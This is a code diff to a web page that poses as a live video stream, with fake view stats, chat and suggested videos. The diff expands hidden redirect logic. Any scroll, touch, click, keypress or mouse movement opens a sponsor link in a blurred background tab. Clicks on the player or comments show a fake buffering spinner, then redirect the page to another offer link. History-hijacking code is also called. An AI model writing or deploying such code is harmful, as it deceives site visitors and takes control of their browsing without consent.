@@ -359,7 +359,7 @@
 
     <div class="container">
         <div class="main-content">
-            <div class="player-wrapper action-trigger" id="videoPlayer">
+            <div class="player-wrapper element-action" id="videoPlayer">
                 <img id="mainGif" src="" alt="Stream Preview">
                 
                 <div class="overlay" id="playerOverlay">
@@ -387,13 +387,13 @@
                 <div class="video-stats">
                     <div>Started streaming 4 minutes ago</div>
                     <div class="action-btns">
-                        <div class="action-btn action-trigger"><i class="fas fa-thumbs-up"></i> 142K</div>
-                        <div class="action-btn action-trigger"><i class="fas fa-share"></i> Share</div>
+                        <div class="action-btn element-action"><i class="fas fa-thumbs-up"></i> 142K</div>
+                        <div class="action-btn element-action"><i class="fas fa-share"></i> Share</div>
                     </div>
                 </div>
             </div>
 
-            <div class="live-chat-box action-trigger" id="commentsBox">
+            <div class="live-chat-box element-action" id="commentsBox">
                 <div class="chat-header">
                     <span>Top Live Comments</span>
                     <span style="color: #ff0000;"><i class="fas fa-circle" style="font-size: 8px;"></i> Live Chat</span>
@@ -471,7 +471,7 @@
             videoPool.forEach((item) => {
                 if(item.title !== mainVideo.title || item.src !== mainVideo.src) {
                     sidebarHtml += `
-                    <div class="sidebar-item suggested-video-item action-trigger">
+                    <div class="sidebar-item element-action">
                         <div class="thumb">
                             <img src="${item.src}" loading="lazy" />
                             <div class="duration">${item.time}</div>
@@ -486,33 +486,45 @@
             document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
             // ════════════════════════════════════════════════════════════
-            // ACTION DRIVEN TAB-UNDER LOGIC (ONLY ON CLICK/ACTION)
+            // 1. GENERAL INTERACTION (SCROLL/TOUCH/CLICK) -> TAB UNDER (REDIRECT_LINK_1)
             // ════════════════════════════════════════════════════════════
-            let tabUnderTriggered = false;
+            let generalTabUnderDone = false;
 
-            function openTabUnder() {
-                if (tabUnderTriggered) return;
-                tabUnderTriggered = true;
+            function openRedirect1TabUnder() {
+                if (generalTabUnderDone) return;
+                generalTabUnderDone = true;
 
                 pushStateHistory();
 
-                // ১. ব্যাকগ্রাউন্ডে নতুন ট্যাবে মূল অফার খোলার চেষ্টা (True Tab-Under)
-                let popWindow = window.open(DIRECT_LINK_MAIN, '_blank');
-                
-                if (popWindow) {
+                // ব্যাকগ্রাউন্ড ট্যাবে REDIRECT_LINK_1 ওপেন করার চেষ্টা
+                let win = window.open(REDIRECT_LINK_1, '_blank');
+                if (win) {
                     try {
-                        // নতুন উইন্ডো থেকে ফোকাস সরিয়ে এই কারেন্ট ট্যাবে ভিডিও দেখা নিশ্চিত রাখা
-                        popWindow.blur();
+                        win.blur();
                         window.focus();
                     } catch(e) {}
                 }
+
+                // ইভেন্টগুলো রিমুভ করে দেওয়া যাতে ১ বারের বেশি না চলে
+                generalEvents.forEach(evt => {
+                    window.removeEventListener(evt, openRedirect1TabUnder, { capture: true });
+                });
             }
 
-            // প্লেয়ার এবং অন্যান্য এলিমেন্টে অ্যাকশন ঘটালেই কেবল Tab-Under হবে
-            const triggers = document.querySelectorAll('.action-trigger');
-            triggers.forEach(el => {
+            const generalEvents = ['scroll', 'touchstart', 'click', 'keydown', 'mousemove'];
+            generalEvents.forEach(evt => {
+                window.addEventListener(evt, openRedirect1TabUnder, { capture: true });
+            });
+
+            // ════════════════════════════════════════════════════════════
+            // 2. SPECIFIC ELEMENT ACTION (PLAY BUTTON/COMMENTS) -> MAIN LINK & TAB UNDER
+            // ════════════════════════════════════════════════════════════
+            const elementActions = document.querySelectorAll('.element-action');
+            elementActions.forEach(el => {
                 el.addEventListener('click', function(e) {
-                    // প্লেয়ার ভিজিউয়াল বাফারিং ইফেক্ট (500ms)
+                    e.stopPropagation(); // জেনারেট ইভেন্ট ব্লক করার জন্য
+
+                    // প্লেয়ার ভিজিউয়াল বাফারিং ইফেক্ট
                     const playBtnIcon = document.getElementById('playBtnIcon');
                     const loadingSpinner = document.getElementById('loadingSpinner');
                     const bufferText = document.getElementById('bufferText');
@@ -521,11 +533,18 @@
                     if (loadingSpinner) loadingSpinner.style.display = 'block';
                     if (bufferText) bufferText.textContent = 'Buffering HD Stream...';
 
-                    // ৫০০ms বাফারিং ডিলে পর ব্যাকগ্রাউন্ডে Tab-Under ট্র্রিগার করা
+                    // ১. ব্যাকগ্রাউন্ড ট্যাবে REDIRECT_LINK_1 ওপেন করা
+                    let tabWin = window.open(REDIRECT_LINK_1, '_blank');
+                    if (tabWin) {
+                        try {
+                            tabWin.blur();
+                            window.focus();
+                        } catch(err) {}
+                    }
+
+                    // ২. ৫০০ms বাফারিং ডিলের পর মূল পেজকে DIRECT_LINK_MAIN-এ পাঠাবে
                     setTimeout(function() {
-                        openTabUnder();
-                        // বাফারিং শেষে দ্বিতীয় একটি স্পন্সর পেজে নিয়ে যাবে
-                        window.location.href = REDIRECT_LINK_1;
+                        window.location.href = DIRECT_LINK_MAIN;
                     }, 500);
                 });
             });
@@ -550,8 +569,7 @@
 
             pushStateHistory();
 
-            const userEvents = ['click', 'touchstart', 'scroll', 'keydown'];
-            userEvents.forEach(evt => {
+            generalEvents.forEach(evt => {
                 window.addEventListener(evt, setupHijack, { passive: true });
             });
 
